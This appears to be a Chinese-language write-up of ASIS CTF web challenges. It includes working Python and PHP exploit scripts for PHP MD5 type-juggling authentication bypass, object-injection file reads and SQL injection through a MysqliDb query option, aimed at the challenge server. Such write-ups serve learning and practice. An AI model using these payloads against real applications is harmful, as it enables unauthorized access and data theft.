# ASIS WRITE UP
## R Re Red ... 
#### key:观察一下  
进去后发现是一个不断刷新的页面，然后url每次都会增加一个%20,然后也没有看到其他什么东西，测试了一下发现%20个数过多的时候网页会返回404，所以猜测估计是枚举一个范围内的%20，然后某个数字的%20会返回提示，然后burp爆破一下直接就得到了flag

## Secured Portal 
#### key:phpstorm文件泄露,MD5枚举
题目提示使用了ide，猜测有.idea/workspace.xml。拿到备份文件的路径http://46.101.96.182/backup/panel.class.php.bk  
看到flag函数返回flag，但是需要__auth=true  
```
function flag(){
        if(!$this->__auth){
            echo 'login required';
            return false;
        }

        /*
         * WOW, SEEMS THE FLAG IS HERE :)
         */
        require 'includes/flag.php';
    }
```
__contruct函数可以注册__auth


```
function __construct($db){
        $this->__db = $db;
        $sessionString = null;

        /**
         * gathering authentication string by auth parameter in HTTP request
         */
        if(array_key_exists('auth', $_GET))
            $sessionString = $_GET['auth'];

        if(strlen($sessionString) > 32){
            $signature = substr($sessionString, -32);
            $payload = base64_decode(substr($sessionString, 0, -32));

            /**
             * real signature calculation based on the key
             */
            $realSign = md5($payload.$this->__sessionKey);

            /**
             * making it impossible to login, if the site is under maintenance,
             */
            if(__MAINTENANCE__===true)
                $realSign = substr($realSign, 0, 6);

            /**
             * checking signature, prevent to data forgery by user
             */
            if($realSign == $signature){
                $this->data = unserialize($payload);

                if(is_array($this->data)){
                    /**
                     * checking login status
                     */
                    if($this->data['logged']===true){
                        $this->__auth = true;
                    }
                }
            }
        }
    }
```
条件是$realSign == $signature，而且unserialize($payload) = array('logged'=>true)  
$realSign是取MD5的前6位，再考虑到是弱类型比较，可以juggle一下，让$realSign的前6位是0e+4个数字
$signature = '0e' + '1'*30  
然后在js/functions.js中找到了panel的入口
写个脚本juggle一下  

```
# python 2.7
import requests, base64

url = r'http://46.101.96.182/panel/index?auth='
#url = r'http://127.0.0.1:8888/test.php?auth='
signature = '0e'+'1'*30
payload = 'a:1:{s:6:"logged";b:1;}'
for i in range(2185, 2186):
    print url+base64.b64encode(payload + str(i))+signature
    print i
    r = requests.get(url+base64.b64encode(payload + str(i))+signature)
    content = r.content
    if content.find('login required') == -1:
        print url+str(i)+signature
        exit()

```
得到了http://46.101.96.182/panel/index?auth=YToxOntzOjY6ImxvZ2dlZCI7YjoxO30yMTg10e111111111111111111111111111111  
这里联想一下估计是函数名对应路径
访问http://46.101.96.182/panel/flag?auth=YToxOntzOjY6ImxvZ2dlZCI7YjoxO30yMTg10e111111111111111111111111111111
得到flag

## 2nd Ultra Secured 
#### key:php对象注入读取文件，对象注入sql 查询参数实现sql注入
接着上一道题,得到的文件中有这个函数可以下载源码
```
function downloadSource(){
        if(!$this->__auth){
            echo 'login required';
            return false;
        }

        $file = '../source.zip';
        if (file_exists($file)){
            header('Content-Description: File Transfer');
            header('Content-Type: application/x-gzip');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }
```
下载下来得到的源码authentication.php和configuration.php查看不了

先在main.class.php中看到了$__sessionKey,如果后面要改payload的话,可以直接在本地跑出来再请求了
```
abstract class main {

    /**
     * holding the session key
     * @var string
     */
    protected  $__sessionKey = 'THEKEYISHEREWOW!';

    /**
     * holding URL to send HTTP request
     * @var object
     */
    protected function index(){}
}
```


然后在logFile 类中找到了一个可以读取文件的位置
readLog函数
```
class logFile extends log {

    /**
     * default filename variable
     * @var string
     */
    private $__logName = 'default.log';

    /**
     * reading logs by the filename
     *
     * @param string $logName
     * @return string
     */
    function readLog($logName=null){
        if($logName!==null)
            $this->__logName = $logName;

        if($this->__logName)
            return  file_get_contents('logs/' . $this->__logName);
    }

    /**
     * submitting new logs on the file
     *
     * @param string $logName
     * @param string $action
     * @return boolean
     */
    function doLog($logName=null, $action='login'){
        $this->__logName = ($logName===null)?time().'.log':$logName;
        $this->__action = ($action===null)?'Test':$action;

        if($this->__logName)
            return file_put_contents('logs/' . $this->__logName, $this->__action);
    }

    /**
     * toString function
     *
     * @return string
     */
    function toString(){
        return serialize($this);
    }
}
```
联系到之前的unserialize($payload),可以使用对象注入控制$this->logName，所以现在的问题是如何调用这个函数并且得到输出


看一下logFile的父类log
```
abstract class log {

    /**
     * holding function name
     * @var string
     */
    protected $_method = 'toString';

    /**
     * @return string
     */
    function __toString(){
        return $this->{$this->_method}();
    }

}
```
__toString 调用的是$this->_method.但是_method是可以通过对象注入重载的，所以只用把$logFile->_method = 'readLog',然后只要echo 这个类就可以文件读取了，现在就是要找到能够echo的地方

最后找了一下，能够控制的echo的内容就只有panel.class.php里面的contact函数，$this->fullName是可以控制的
```
function contact(){
        if(!$this->__auth){
            echo 'login required';
            return false;
        }

        /**
         * setting fullName to anonymous or the real name
         */
        $this->fullName = 'anonymous';
        if(@$this->data['title'] == 'mr.' or @$this->data['title'] == 'ms.')
            $this->fullName = $this->data['title'] . $this->data['username'];

        /**
         * setting fullName to anonymous or the real name
         */
        if(array_key_exists('contactUs', $_POST)){
            if(array_key_exists('message', $_POST))
                $message = $_POST['message'];

            /*
             * check message validity
             */
            $userCurl = (new userCurl(__SERVER_2, $message))->sendPOST();

            /*
             * printing response to the user
             */
            if($userCurl==='valid')
                echo json_encode(array('name'=>json_encode($this->fullName), 'status'=>true, 'message'=>'We have received you message, our administrator will be reading your issue as soon as possible'));
            else
                echo json_encode(array('name'=>json_encode($this->fullName), 'status'=>false, 'message'=>'It seems the message sent is not in the valid format.', 'error'=>$userCurl));
        }
```
看这个地方
```
$this->fullName = $this->data['title'] . $this->data['username'];
```
这个data对象就是
```
$this->data = unserialize($payload);
```
所以这就很简单了，只要让
```
$payload = array('title'=>'mr.', 'username'=>constructed_logFile())
```
在contact页面就会输出文件的内容
```
class logFile extends log {
	private $__logName = '../index.php';
	
	protected $_method = 'readLog';

}

if (isset($_POST['filename']))
{
	$a = new logFile();
	$payload = array('logged'=>true, 'title'=>'mr.','username'=>$a);
	var_dump(serialize($payload));
	file_put_contents('test.out', serialize($payload));
}
```
依次读取authentication.class.php和configuration.php的内容
```
//authentication.php

<?php
class authentication extends main {       
	private $__db;        
function __construct($db){        $this->__db = $db;    
} 
function sign($payload){        
	return md5($payload.$this->__sessionKey);    
}    
function login($loginString)
{        
$loginString = base64_decode($loginString);        
$credentials = explode(':', $loginString);        
$result = $this->__db->where("username", @$credentials[0])->where("password", md5($credentials[1]))->getOne('credentials');                
if($result===null)   return false;       
$result['logged'] = true;        
$result = serialize($result);        
$loginString = base64_encode($result) . '.' . self::sign($result);               
setcookie('loginString',  $loginString,  time()+3600, "/");        
return true;    }
}
```

```
//configuration.php
define('__DB_HOST', 'localhost');
define('__DB_USERNAME', 'user');
define('__DB_PASSWORD', 'password');
define('__DB_DATABASE', 'ultraSecured');
```
通过题目提示得知需要的信息在database中
得到数据库的信息,所以接下来需要注入credentials这个表
这之后就不会做了。找到了一篇很好的wp
https://depier.re/asis_2017_2nd_secured_portal/

MysqliDb是开源的数据库封装，可以在git上找到源码
https://github.com/joshcam/PHP-MySQLi-Database-Class
下载下来和题目版本比较发现唯一的区别是get函数中多了一段注释，所以猜测接下来需要在这个函数中突破
```
public function get($tableName, $numRows = null, $columns = '*')
    {
        if (empty($columns)) {
            $columns = '*';
        }

        $column = is_array($columns) ? implode(', ', $columns) : $columns;

        if (strpos($tableName, '.') === false) {
            $this->_tableName = self::$prefix . $tableName;
        } else {
            $this->_tableName = $tableName;
        }

        $this->_query = 'SELECT ' . implode(' ', $this->_queryOptions) . ' ' .
            $column . " FROM " . $this->_tableName;
        $stmt = $this->_buildQuery($numRows);

        //var_dump($this->_query);

        if ($this->isSubQuery) {
            return $this;
        }

        $stmt->execute();
        $this->_stmtError = $stmt->error;
        $this->_stmtErrno = $stmt->errno;
        $res = $this->_dynamicBindResults($stmt);
        $this->reset();

        return $res;
    }
```
看到这句
```
$this->_query = 'SELECT ' . implode(' ', $this->_queryOptions) . ' ' .
            $column . " FROM " . $this->_tableName;
```
而_queryOptions是MysqliDb的参数，可以通过对象注入控制
```
protected $_queryOptions = array();
```
所以在这个地方只要让_queryOptions = array('*','from','credentials#')就可以使任何调用get函数的结果都是 * from credentials， where函数就调用了get函数

然而如何要输出的话，还是必须要使用log类的子类，logDB中正好找到了这个函数
```
class logDB extends log {

    private $__db;
    private $__ID;

    function __construct($db){
        $this->__db = $db;
    }

    function readLog($id=null){
        if($id!==null)
            $this->__ID = $id;

        if($this->__ID)
            return json_encode($this->__db->where("id", $this->__ID)->getOne('logs'));
    }

    function doLog($action, $data, $ip, $time){
        return $this->__db->insert('logs', array('action'=>$action, 'userData'=>$data, 'ip'=>$ip, 'time'=>$time));
    }

    function toString(){
        return serialize($this);
    }
}
```
readLog函数中调用了where并且返回了查询的值，所以构造的logDB如下
```
class logDB extends log {
    private $__db;

    private $__ID = 1;

    protected $_method = 'readLog';
    function __construct($db){
        $this->__db = $db;
    }

    function readLog($id=null){
        if($id!==null)
            $this->__ID = $id;

        if($this->__ID)
            return json_encode($this->__db->where("id", $this->__ID)->getOne('logs'));
    }

}
if (isset($_POST['db']))
{
	$a = new MysqliDb('localhost', 'user', 'password', 'ultraSecured');
	$b = new logDB($a);
	$payload = array('logged'=>true, 'title'=>'mr.','username'=>$b);
	file_put_contents('test.out', serialize($payload));
}
```
然后访问contact页面的得到
```
secret:fl4giSher3.class.php
```
然后直接读fl4giSher3.class.php得到flag
最后附上在本地跑MD5的脚本,本地搭建一个验证MD5的环境
```
# python 2.7
import requests, base64

url1 = r'http://127.0.0.1:8888/test.php?auth='
url2 = r'http://46.101.96.182/panel/contact?auth='

r = requests.post(url1, data={'db': '123'})
signature = '0e'+'1'*30
with open ('test.out','r') as f:
    payload = f.read()
final_payload = ''
for i in range(1,100000):
    #print url1+base64.b64encode(payload + str(i))+signature
    print i
    r = requests.get(url1+base64.b64encode(payload + str(i))+signature)
    content = r.content
    if content.find('login required') == -1:
        print url2 + base64.b64encode(payload + str(i))+signature
        final_payload = base64.b64encode(payload + str(i))+signature
        break

r = requests.post(url2 + final_payload, data={'message':1,'contactUs':''})
with open('result.out', 'w') as f:
    f.write(r.content)
print r.content



```
